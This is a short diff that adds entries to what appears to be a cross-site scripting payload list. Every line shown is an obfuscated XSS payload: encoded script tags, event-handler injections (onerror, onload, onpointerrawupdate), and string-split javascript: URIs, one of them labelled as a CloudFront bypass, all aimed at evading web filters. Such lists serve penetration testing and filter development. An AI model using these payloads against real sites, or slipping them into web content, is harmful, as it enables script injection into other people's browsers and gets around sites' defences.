@@ -69,3 +69,8 @@ javascript:eval(atob('d2luZG93LlthbGVydF0oJ1hTUycp'));
 %3Cscript%3Edocument.body.innerHTML%20%3D%20%27%3Cscript%3Ewindow%5B%27al%27%2B%27ert%27%5D%28%22XSS%22%29%3C%2Fscript%3E%27%3B%3C/script%3E
 %3Cscript%3Enew%20Function%28%27window%5B%27al%27%2B%27ert%27%5D%28%22XSS%22%29%27%29%28%29%3B%3C/script%3E
 %3Cimg%20src%3D%22x%22%20onerror%3D%22window%5B%27al%27%2B%27ert%27%5D%28%27XSS%27%29%22%3E
+“>%0D%0A%0D%0A<x ‘=”foo”><x foo=’><img src=x onerror=javascript:alert(cloudfrontbypass)//’>
+<xxx/x=">"/onpointerrawupdate=top[8680439..toString(30)]`1`>HOVER_ME
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
